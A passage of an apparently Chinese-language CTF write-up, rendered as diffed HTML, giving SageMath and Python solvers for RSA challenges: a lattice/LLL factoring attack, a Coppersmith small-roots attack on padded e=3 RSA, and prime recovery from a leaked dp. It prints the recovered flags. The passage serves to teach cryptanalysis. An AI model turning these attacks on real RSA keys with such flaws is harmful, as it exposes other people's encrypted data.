class="mi">1037185901048299733994080148617255395054343048856247908410601987778479809878530408488320575174117338778636437390189707472850545495340030261432470823966833296599326227471363743571435638488350843501335163114522221236295887873384511904404076136719828753484908833522690485308801343692672087896916151728355339557063865979845334871596911380941183991996355328789626661832721727696996294542137065146082233136253</span><span class="p">]</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ==========================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">h1</span><span class="p">,</span> <span class="n">h2</span><span class="p">,</span> <span class="n">h3</span> <span class="o">=</span> <span class="n">hints</span> 
+</span></span><span class="line"><span class="cl"><span class="n">L</span> <span class="o">=</span> <span class="n">matrix</span><span class="p">(</span><span class="n">hints</span><span class="p">)</span><span class="o">.</span><span class="n">T</span><span class="o">.</span><span class="n">augment</span><span class="p">(</span><span class="n">matrix</span><span class="o">.</span><span class="n">identity</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl"><span class="n">L</span><span class="p">[:,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">*=</span> <span class="n">n</span> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">L</span> <span class="o">=</span> <span class="n">L</span><span class="o">.</span><span class="n">LLL</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">L</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">([</span><span class="n">x</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">v</span><span class="p">])</span> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">_</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span> <span class="n">v</span> <span class="o">=</span> <span class="n">L</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a1s</span><span class="p">,</span> <span class="n">a2s</span><span class="p">,</span> <span class="n">a3s</span><span class="p">,</span> <span class="n">b1s</span><span class="p">,</span> <span class="n">b2s</span><span class="p">,</span> <span class="n">b3s</span> <span class="o">=</span> <span class="n">QQ</span><span class="p">[</span><span class="s2">&#34;a1,a2,a3,b1,b2,b3&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">gens</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">sign</span> <span class="ow">in</span> <span class="n">product</span><span class="p">((</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">I</span> <span class="o">=</span> <span class="n">ideal</span><span class="p">(</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">[</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">a3s</span> <span class="o">*</span> <span class="n">b2s</span> <span class="o">-</span> <span class="n">a2s</span> <span class="o">*</span> <span class="n">b3s</span> <span class="o">+</span> <span class="n">sign</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">t</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">a3s</span> <span class="o">*</span> <span class="n">b1s</span> <span class="o">-</span> <span class="n">a1s</span> <span class="o">*</span> <span class="n">b3s</span> <span class="o">+</span> <span class="n">sign</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="n">u</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">a2s</span> <span class="o">*</span> <span class="n">b1s</span> <span class="o">-</span> <span class="n">a1s</span> <span class="o">*</span> <span class="n">b2s</span> <span class="o">+</span> <span class="n">sign</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="n">v</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">]</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">I</span><span class="o">.</span><span class="n">dimension</span><span class="p">()</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">sign</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;dim&#34;</span><span class="p">,</span> <span class="n">I</span><span class="o">.</span><span class="n">dimension</span><span class="p">())</span> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">step2</span><span class="p">(</span><span class="n">f</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">            <span class="c1"># this f is in the form of k1*a1+k2*a2+k3*a3==0</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># for some reason, k1*b1+k2*b2+k3*b3==0 also holds</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># use LLL to find it</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">40</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">L</span> <span class="o">=</span> <span class="n">matrix</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">coefficients</span><span class="p">())</span><span class="o">.</span><span class="n">T</span><span class="o">.</span><span class="n">augment</span><span class="p">(</span><span class="n">matrix</span><span class="o">.</span><span class="n">identity</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">L</span><span class="p">[:,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">*=</span> <span class="n">n</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">L</span> <span class="o">=</span> <span class="n">L</span><span class="o">.</span><span class="n">LLL</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">L</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> 
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">L</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">v1</span> <span class="o">=</span> <span class="n">L</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">v2</span> <span class="o">=</span> <span class="n">L</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">xs</span> <span class="o">=</span> <span class="p">[]</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">c1</span><span class="p">,</span> <span class="n">c2</span> <span class="ow">in</span> <span class="n">product</span><span class="p">((</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">2</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">v</span> <span class="o">=</span> <span class="n">c1</span> <span class="o">*</span> <span class="n">v1</span> <span class="o">+</span> <span class="n">c2</span> <span class="o">*</span> <span class="n">v2</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">_</span><span class="p">,</span> <span class="n">x1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">x3</span> <span class="o">=</span> <span class="n">v</span> 
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nb">all</span><span class="p">([</span><span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">x</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">312</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">x3</span><span class="p">)]):</span> 
+</span></span><span class="line"><span class="cl">                    <span class="n">xs</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">x1</span><span class="p">,</span> <span class="n">x2</span><span class="p">,</span> <span class="n">x3</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">             <span class="c1"># we don&#39;t know which one is correct pair of (a1, a2, a3) and (b1, b2, b3)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># just try all combinations</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">g1</span><span class="p">,</span> <span class="n">g2</span> <span class="ow">in</span> <span class="n">combinations</span><span class="p">(</span><span class="n">xs</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">a1r</span><span class="p">,</span> <span class="n">a2r</span><span class="p">,</span> <span class="n">a3r</span> <span class="o">=</span> <span class="n">g1</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">b1r</span><span class="p">,</span> <span class="n">b2r</span><span class="p">,</span> <span class="n">b3r</span> <span class="o">=</span> <span class="n">g2</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">q</span> <span class="o">=</span> <span class="n">gcd</span><span class="p">(</span><span class="n">a2r</span> <span class="o">*</span> <span class="n">h1</span> <span class="o">-</span> <span class="n">a1r</span> <span class="o">*</span> <span class="n">h2</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">q</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">q</span> 
+</span></span><span class="line"><span class="cl">                    <span class="n">e</span> <span class="o">=</span> <span class="mh">0x10001</span> 
+</span></span><span class="line"><span class="cl">                    <span class="n">d</span> <span class="o">=</span> <span class="n">inverse_mod</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">                    <span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                    <span class="n">flag</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span> <span class="s2">&#34;big&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">                    <span class="n">exit</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="n">step2</span><span class="p">(</span><span class="n">I</span><span class="o">.</span><span class="n">groebner_basis</span><span class="p">()[</span><span class="mi">1</span><span class="p">])</span> 
+</span></span><span class="line"><span class="cl"><span class="c1"># DASCTF{0rtho_l4tt1c3_1s_fun_and_gr34t}</span>
+</span></span></code></pre></div><div id="insecure_padding" class="anchor"></div>
+<h3 class="relative group">insecure_padding 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#insecure_padding" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>m的低位padding了130*8=1040位</p>
+<p>c相当于</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">flag</span><span class="o">*</span><span class="mi">2</span><span class="o">^</span><span class="mi">1040</span><span class="o">+</span><span class="mi">777</span><span class="n">p</span> <span class="o">+</span><span class="mi">666</span> <span class="n">mod</span> <span class="n">n</span>
+</span></span></code></pre></div><p>的三次方</p>
+<p>因为n=p*q</p>
+<p>在求小根里面可以用mod n把+777*p的影响给消去</p>
+<p>所以在构造f时不需要加入777*p</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">c</span><span class="o">=</span>  <span class="mi">1193333119181381225632504634109476125461718042032463066180160159530821008151288619914035008577444580123023483451618973104785206841878926362053767758825420307104536873166791566346076985369125399199847240472385775854381103486198612767122009780041785220241663307760491699892303259600093817957324293717178123893664313547870460181936283477289029428950611459484805364390503487619676794166358047636359524103138509752217552291498141048509236471615548177017684230320627457</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">1345974903151028106176188777499919289689885052993818155551239513162986365479059645712347472719763678799888312063629534224676532524320490059299999431455806985776161385636341889882617880557005343019148419971407438285456200388681742721058826527478752200546957229924712840178042652788689761602760552457535667154424045780264689394678280189407534443469304768432295723527834457536647823320807747766083091825227699222804959851169910812454526260545186908048603618547346519</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># pad_length = 130 1040</span>
+</span></span><span class="line"><span class="cl"><span class="n">R</span><span class="o">.&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">Zmod</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># pad = long_to_bytes(777*p+666)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># m = bytes_to_long(m+pad)  低位填充 高位m不变</span>
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="o">*</span><span class="mi">2</span><span class="o">^</span><span class="mi">1040</span> <span class="o">+</span> <span class="mi">666</span><span class="p">)</span><span class="o">^</span><span class="mi">3</span> <span class="o">-</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">monic</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ans</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">small_roots</span><span class="p">(</span><span class="n">X</span><span class="o">=</span><span class="mi">256</span><span class="o">^</span><span class="mi">20</span><span class="p">,</span><span class="n">beta</span><span class="o">=</span><span class="mf">0.4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 458155254755585178780244660112014285664403156596</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># P@dding_1s_important</span>
+</span></span></code></pre></div><div id="ez_rsa_5" class="anchor"></div>
+<h3 class="relative group">EZ_RSA_5 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#ez_rsa_5" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>思路类似于HITCON2019一道题</p>
+<p><a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again"   target="_blank">
+    write-up/2019/HITCON/Lost_Modulus_Again at master ·pcw109550/写入 &mdash; write-up/2019/HITCON/Lost_Modulus_Again at master · pcw109550/write-up (github.com)</a></p>
+<p><a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again"   target="_blank">
+    https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again</a></p>
+<p>前半部分leak dp求PQ直接上板子</p>
+<p>后半部分数论题 得解个二元的方程</p>
+<p>因为</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Mathematica" data-lang="Mathematica"><span class="line"><span class="cl"><span class="n">p1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gmpy2</span><span class="err">.</span><span class="n">invert</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">q1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gmpy2</span><span class="err">.</span><span class="n">invert</span><span class="p">(</span><span class="n">q</span><span class="p">,</span><span class="n">p</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">q</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">p1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">k1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">p</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">p</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">q1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">k2</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">q</span><span class="w"> 
+</span></span></span></code></pre></div><p>所以有</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Mathematica" data-lang="Mathematica"><span class="line"><span class="cl"><span class="n">phi</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">p1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="n">q1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="p">(</span><span class="n">p1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">k1</span><span class="w"> </span><span class="o">+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="p">(</span><span class="n">q1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">k2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">k1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">k2</span><span class="w">
+</span></span></span></code></pre></div><p>由于</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">k2</span> <span class="n">和</span> <span class="n">q</span> <span class="o">=</span> <span class="n">y</span> <span class="o">+</span> <span class="n">k1</span>
+</span></span></code></pre></div><p>整理一下得到</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Mathematica" data-lang="Mathematica"><span class="line"><span class="cl"><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">k1</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">phi</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="n">y</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">k1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">y</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
+</span></span></span></code></pre></div><p>用万能求根公式解k1 k2</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sympy</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">K</span> <span class="o">=</span> <span class="mi">3995906172915513953882445609459153360257793100017419734812726991957587919349807133880917342081892953635338598486012480314014321088548439223094566668968735207492741920107799674089668131177188073985125603237341660194741854181484934968528811686828555591685803851909027192343245722679639249600176791158349393704697742640442010893811830528349203606514981272974154582682489532205008927740716725904614810707240205595586894383039181983075907373556864396176123489201513001026708388504250801785422323131912494763394371589512367935031912074535458595633402462463667072692589863355712935552396330534658448628449816139943205511637</span>
+</span></span><span class="line"><span class="cl"><span class="n">dp</span> <span class="o">=</span> <span class="mi">53589538487289875479012684116246778147274714450209576105277816626983528993595125486641833027290704077932308918237978477501981907543847383655230156916578979044682282870153618849419762148348930652564442177633668690473147864322377146889467662769284463217004314651469157455678363085510100707437896627192687923547</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+</span></span><span class="line"><span class="cl"><span class="n">p1</span> <span class="o">=</span> <span class="mi">2636020992576559969055483957060200941734026828135579110378070592732862908176025649071069827089999996350015210043636523971348821850565913816154887832272305</span>
+</span></span><span class="line"><span class="cl"><span class="n">q1</span> <span class="o">=</span> <span class="mi">7886513101716991094728039196608717849158915101115291363845210343608904418304571443491051842715241903123031976527174063528298034452215971449949398656913945</span>
+</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="mi">115505961171763309547793530782914001823768056515083869218337105172209622283311582473506324170565971054492347897941697574972266679462737991988159654350224823122310342866537098903019067348499259894857405865405379172014292034138593409888061494667098647947191077373457924105640280156013690526621147715122416478264</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_pq</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">dp</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">e</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">dp</span> <span class="o">*</span> <span class="n">e</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">i</span>        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">t</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">dp</span> <span class="o">*</span> <span class="n">e</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">n</span> <span class="o">%</span> <span class="n">p</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">q</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="n">p</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">p</span><span class="p">,</span><span class="n">q</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">D</span> <span class="o">=</span> <span class="n">b</span><span class="o">**</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">a</span> <span class="o">*</span> <span class="n">c</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x1</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">b</span> <span class="o">+</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">D</span><span class="p">))</span> <span class="o">//</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x2</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">b</span> <span class="o">-</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">D</span><span class="p">))</span> <span class="o">//</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x1</span><span class="p">,</span> <span class="n">x2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">P</span><span class="p">,</span><span class="n">Q</span> <span class="o">=</span> <span class="n">get_pq</span><span class="p">(</span><span class="n">K</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">dp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">P</span><span class="p">,</span><span class="n">Q</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">P</span> <span class="o">=</span><span class="mi">89706459192396530593549443920371512846107199328839237547229758327568121878195799315931797683572600269608687634404290962684155916188631860811034680949192525086238991914925741833782609688548028611711472171734508568556069872649373734405124829887118997365400928949792704456407061927794321219467125520582544212039</span>
+</span></span><span class="line"><span class="cl"><span class="n">Q</span> <span class="o">=</span> <span class="mi">44544241394539455087080003827042433390596610554187086515097380871947145536991877216409262767617552724165444473076549560658417398194657348107209262950353565993877966067642602951964287850776064487853037993132356275513691026700801254797314898063932907251598380047383415220014112316421578570998223070668797351683</span>
+</span></span><span class="line"><span class="cl"><span class="n">phi_K</span><span class="o">=</span><span class="p">(</span><span class="n">P</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">Q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">phi_n</span> <span class="o">=</span> <span class="n">phi_K</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fun</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 万能求根根公式</span>
+</span></span><span class="line"><span class="cl">    <span class="n">a</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="mi">1</span>
